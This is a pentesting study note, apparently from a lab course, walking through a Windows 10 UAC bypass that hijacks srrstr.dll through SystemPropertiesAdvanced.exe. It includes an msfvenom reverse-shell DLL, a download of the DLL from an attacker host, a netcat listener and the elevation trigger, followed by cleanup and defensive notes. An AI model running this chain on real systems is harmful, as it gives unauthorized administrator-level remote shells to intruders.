---
title: Windows Privilege Escalation – UAC Bypass via SystemPropertiesAdvanced DLL Hijacking
aliases:
  - UAC Bypass
  - User Account Control
  - SystemPropertiesAdvanced UAC Bypass
  - srrstr.dll DLL Hijacking
  - UACME Technique 54
tags:
  - windows
  - privilege-escalation
  - uac
  - uac-bypass
  - dll-hijacking
  - systempropertiesadvanced
  - srrstr-dll
  - integrity-levels
  - windows-10
  - uacme
  - pentesting
---

## Overview

User Account Control, or `UAC`, is a Windows feature that prompts for consent before elevated actions are performed.

Applications run at different integrity levels. A process running at a high integrity level can perform administrative actions that may modify or compromise the system.

When UAC is enabled, applications and tasks run under a non-administrative security context unless an administrator explicitly authorizes elevation.

> [!important]
> UAC is a convenience and hardening feature, but it is not considered a formal security boundary.

---

# Why UAC Matters

When an administrator logs in with Admin Approval Mode enabled, Windows provides two access tokens:

| Token | Purpose |
|---|---|
| Medium-integrity token | Used by default for normal user actions |
| High-integrity token | Used after elevation for administrative actions |

This means a user may be a local administrator but still execute commands with a filtered, medium-integrity token.

In practice:

```text
User is in Administrators group
↓
Current shell is medium integrity
↓
Administrative privileges are filtered
↓
UAC bypass or consent is needed to use high-integrity token
```

---

# UAC Group Policy Settings

UAC behavior can be configured locally with `secpol.msc` or centrally with Group Policy.

Important UAC-related registry values include:

| Group Policy Setting | Registry Key | Default Setting |
|---|---|---|
| Admin Approval Mode for the built-in Administrator account | `FilterAdministratorToken` | Disabled |
| Allow UIAccess applications to prompt without secure desktop | `EnableUIADesktopToggle` | Disabled |
| Elevation prompt behavior for administrators | `ConsentPromptBehaviorAdmin` | Prompt for consent for non-Windows binaries |
| Elevation prompt behavior for standard users | `ConsentPromptBehaviorUser` | Prompt for credentials on the secure desktop |
| Detect application installations and prompt for elevation | `EnableInstallerDetection` | Enabled for home, disabled for enterprise |
| Only elevate signed and validated executables | `ValidateAdminCodeSignatures` | Disabled |
| Only elevate UIAccess apps in secure locations | `EnableSecureUIAPaths` | Enabled |
| Run all administrators in Admin Approval Mode | `EnableLUA` | Enabled |
| Switch to secure desktop when prompting | `PromptOnSecureDesktop` | Enabled |
| Virtualize file and registry write failures | `EnableVirtualization` | Enabled |

---

# RID 500 Administrator Behavior

The default RID 500 local Administrator account always operates at the high mandatory integrity level.

By contrast, newly created administrator accounts usually operate at medium integrity by default when Admin Approval Mode is enabled.

Example:

```text
RID 500 Administrator → high mandatory level
New local admin user → medium mandatory level until elevated
```

---

# Example User Context

The example user is:

```text
winlpe-ws03\sarah
```

This user is a member of the local `Administrators` group, but the current shell is running with an unprivileged token.

---

# Step 1 – Check Current User

```cmd
whoami /user
```

Example output:

```cmd
C:\htb> whoami /user

USER INFORMATION
----------------

User Name         SID
================ ==============================================
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
```

---

# Step 2 – Confirm Local Administrator Membership

```cmd
net localgroup administrators
```

Example output:

```cmd
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
mrb3n
sarah
The command completed successfully.
```

The user `sarah` is a local administrator.

---

# Step 3 – Review Current Privileges

```cmd
whoami /priv
```

Example filtered-token output:

```cmd
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

Only limited privileges are visible because the current process is not elevated.

---

# Step 4 – Confirm UAC Is Enabled

Check the `EnableLUA` registry value.

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

Example output:

```cmd
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

Interpretation:

| Value | Meaning |
|---|---|
| `0x1` | UAC enabled |
| `0x0` | UAC disabled |

---

# Step 5 – Check UAC Prompt Level

Check the administrator consent prompt behavior.

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

Example output:

```cmd
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

Interpretation:

```text
ConsentPromptBehaviorAdmin = 0x5
```

This indicates a stricter UAC configuration, commonly associated with `Always notify`.

> [!note]
> Fewer UAC bypasses work at the highest UAC level.

---

# Step 6 – Check Windows Build

UAC bypasses are often build-specific. Check the Windows version and build.

```powershell
[environment]::OSVersion.Version
```

Example output:

```powershell
PS C:\htb> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

The build is:

```text
14393
```

This corresponds to:

```text
Windows 10 Version 1607
```

---

# Attack Concept – SystemPropertiesAdvanced DLL Hijacking

## Target Auto-Elevating Binary

The target binary is the 32-bit version of:

```text
SystemPropertiesAdvanced.exe
```

Path:

```text
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

This binary can auto-elevate in certain contexts.

## Missing DLL

The 32-bit version attempts to load:

```text
srrstr.dll
```

This DLL is associated with System Restore functionality.

If Windows searches a user-writable directory before finding a legitimate DLL, a malicious DLL with the expected name may be loaded in an elevated context.

---

# DLL Search Order

When Windows attempts to locate a DLL, it commonly searches locations in this order:

1. The directory from which the application loaded.
2. The system directory, such as `C:\Windows\System32` on 64-bit systems.
3. The 16-bit system directory, `C:\Windows\System`, not supported on 64-bit systems.
4. The Windows directory.
5. Directories listed in the `PATH` environment variable.

The bypass relies on a writable user-controlled directory appearing in the `PATH`.

---

# Step 1 – Review PATH Variable

```powershell
cmd /c echo %PATH%
```

Example output:

```powershell
PS C:\htb> cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

Important writable directory:

```text
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps
```

This directory is inside the user's profile and is writable by the user.

---

# Step 2 – Generate Malicious srrstr.dll

Generate a DLL payload named:

```text
srrstr.dll
```

Example reverse shell payload:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

Example output:

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 5120 bytes
```

> [!important]
> Use an x86 DLL payload for the 32-bit `SystemPropertiesAdvanced.exe` process.

---

# Step 3 – Host the DLL

Start a Python HTTP server from the directory containing `srrstr.dll`.

```bash
sudo python3 -m http.server 8080
```

---

# Step 4 – Download DLL to the Target

Download the malicious DLL into the writable `WindowsApps` directory.

```powershell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

Target path:

```text
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

> [!tip]
> The DLL name must be exactly `srrstr.dll`.

---

# Step 5 – Start Listener

Start a listener on the attack machine.

```bash
nc -lvnp 8443
```

The listener port should match the payload `LPORT`.

---

# Step 6 – Test the DLL Manually

Before attempting the UAC bypass, test that the DLL executes and produces a callback.

```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

Example listener output:

```text
Swordfish4051@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\sarah> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

This confirms the DLL can execute, but the shell is still running under the filtered, non-elevated token.

---

# Step 7 – Kill Existing rundll32 Processes

Before running the bypass trigger, terminate any previous `rundll32.exe` processes spawned during testing.

Find them:

```cmd
tasklist /svc | findstr "rundll32"
```

Example output:

```cmd
C:\htb> tasklist /svc | findstr "rundll32"

rundll32.exe                  6300 N/A
rundll32.exe                  5360 N/A
rundll32.exe                  7044 N/A
```

Kill each process:

```cmd
taskkill /PID 7044 /F
```

```cmd
taskkill /PID 6300 /F
```

```cmd
taskkill /PID 5360 /F
```

Example output:

```cmd
C:\htb> taskkill /PID 7044 /F

SUCCESS: The process with PID 7044 has been terminated.

C:\htb> taskkill /PID 6300 /F

SUCCESS: The process with PID 6300 has been terminated.

C:\htb> taskkill /PID 5360 /F

SUCCESS: The process with PID 5360 has been terminated.
```

---

# Step 8 – Trigger the UAC Bypass

Run the 32-bit auto-elevating binary.

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

If the bypass works, the binary searches for `srrstr.dll`, finds the malicious DLL in the writable `WindowsApps` path, and loads it in an elevated context.

---

# Step 9 – Receive Elevated Callback

Expected listener output:

```text
Swordfish4051@htb[/htb]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
winlpe-ws03\sarah
```

The username is still `sarah`, but the shell now has the elevated administrator token.

Confirm available privileges:

```cmd
whoami /priv
```

Example elevated privilege output:

```cmd
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

Successful indicators:

- current directory is `C:\Windows\system32`
- many administrator privileges are now visible
- privileges can be enabled if needed

---

# Practical Decision Tree

## Is the user a local administrator?

Check:

```cmd
net localgroup administrators
```

If the user is not a local administrator, this UAC bypass path does not apply.

---

## Is the current shell filtered?

Check:

```cmd
whoami /priv
```

If only limited privileges are visible, the shell is likely medium integrity.

---

## Is UAC enabled?

Check:

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

If value is:

```text
0x1
```

UAC is enabled.

---

## What is the UAC level?

Check:

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

A stricter value such as:

```text
0x5
```

means fewer bypasses may work.

---

## Is the Windows build compatible?

Check:

```powershell
[environment]::OSVersion.Version
```

The demonstrated technique targets:

```text
Windows 10 build 14393
Windows 10 Version 1607
```

---

## Is WindowsApps in PATH?

Check:

```powershell
cmd /c echo %PATH%
```

Look for:

```text
C:\Users\<user>\AppData\Local\Microsoft\WindowsApps
```

If present and writable, proceed.

---

## Is the payload architecture correct?

The target binary is 32-bit:

```text
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

Use an x86 DLL payload.

---

# Troubleshooting

## No callback after running SystemPropertiesAdvanced.exe

Possible causes:

- Windows build is not vulnerable
- UAC level blocks the technique
- DLL name is wrong
- DLL path is not in `PATH`
- payload architecture is wrong
- listener is not running
- firewall blocks outbound connection
- endpoint protection blocks DLL execution
- existing process state interferes with execution

---

## DLL test works but bypass callback is not elevated

Possible causes:

- wrong `SystemPropertiesAdvanced.exe` path
- 64-bit binary was executed instead of 32-bit binary
- DLL loaded in non-elevated context only
- technique is patched on the target
- `WindowsApps` was not searched during DLL resolution

Use:

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

not:

```cmd
C:\Windows\System32\SystemPropertiesAdvanced.exe
```

---

## `whoami` shows same user after bypass

This is expected.

A UAC bypass does not change the user identity. It changes the token integrity and available privileges.

Confirm with:

```cmd
whoami /priv
```

or check process integrity level.

---

## Reverse shell exits immediately

Possible causes:

- payload instability
- DLL entry point behavior
- process exits after DLL execution
- antivirus terminates payload
- network connection drops

Try a different payload style or a more stable callback method within the authorized scope.

---

# Command Reference

## Check current user

```cmd
whoami /user
```

## Check local administrator group

```cmd
net localgroup administrators
```

## Check current privileges

```cmd
whoami /priv
```

## Check if UAC is enabled

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

## Check administrator prompt behavior

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

## Check Windows build

```powershell
[environment]::OSVersion.Version
```

## Review PATH

```powershell
cmd /c echo %PATH%
```

## Generate x86 reverse-shell DLL

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

## Start HTTP server

```bash
sudo python3 -m http.server 8080
```

## Download DLL to WindowsApps

```powershell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

## Start listener

```bash
nc -lvnp 8443
```

## Test DLL execution

```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

## Find rundll32 processes

```cmd
tasklist /svc | findstr "rundll32"
```

## Kill rundll32 process

```cmd
taskkill /PID <pid> /F
```

## Trigger bypass

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

---

# Cleanup Checklist

Remove the malicious DLL:

```cmd
del "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

Terminate payload-related processes:

```cmd
tasklist /svc | findstr "rundll32"
taskkill /PID <pid> /F
```

Document:

- local administrator membership
- UAC registry values
- Windows build
- payload path
- listener details
- bypass trigger used
- elevated privileges observed
- cleanup actions performed

---

# Defensive Notes

## Risks

UAC bypasses can allow a local administrator with a filtered token to silently obtain a high-integrity process.

The risk is highest when:

- users are local administrators
- auto-elevating binaries are abused
- writable directories appear in DLL search paths
- endpoint controls do not detect suspicious DLL placement
- command-line and process telemetry is weak

---

## Defensive Controls

Consider:

- minimizing local administrator membership
- enforcing least privilege
- keeping Windows fully patched
- monitoring for suspicious DLLs in user-writable PATH directories
- monitoring execution of auto-elevating binaries
- alerting on `SystemPropertiesAdvanced.exe` launched from unusual contexts
- monitoring DLL loads from user profile paths
- blocking or alerting on `msfvenom`-style payload behavior
- enabling strong endpoint protection
- using AppLocker or WDAC where appropriate
- reviewing UAC policy settings across endpoints

---

# Key Takeaways

- UAC prompts before elevated administrative actions.
- UAC is not a formal security boundary.
- Local administrators often run with a medium-integrity filtered token until elevated.
- `EnableLUA = 0x1` means UAC is enabled.
- `ConsentPromptBehaviorAdmin = 0x5` indicates a stricter prompt configuration.
- UAC bypass techniques are often Windows-build specific.
- Windows 10 build `14393` corresponds to Windows 10 Version `1607`.
- The 32-bit `SystemPropertiesAdvanced.exe` binary can be abused through `srrstr.dll` DLL hijacking on vulnerable builds.
- A writable user-controlled PATH directory such as `WindowsApps` can be used for DLL planting.
- The payload DLL must match the target process architecture.
- A successful bypass gives an elevated token for the same user, not a different username.
- Cleanup should remove the planted DLL and terminate leftover payload processes.

---

# Related Notes

- [[Windows Privilege Escalation]]
- [[User Account Control]]
- [[UAC Bypass]]
- [[Integrity Levels]]
- [[Admin Approval Mode]]
- [[DLL Hijacking]]
- [[SystemPropertiesAdvanced]]
- [[UACME]]
- [[Windows Auto-Elevation]]
- [[Windows PATH]]
- [[msfvenom]]
- [[Netcat]]

---

# Tags

#windows
#privilege-escalation
#uac
#uac-bypass
#dll-hijacking
#systempropertiesadvanced
#srrstr-dll
#integrity-levels
#admin-approval-mode
#windows-10
#uacme
#msfvenom
#netcat
#pentesting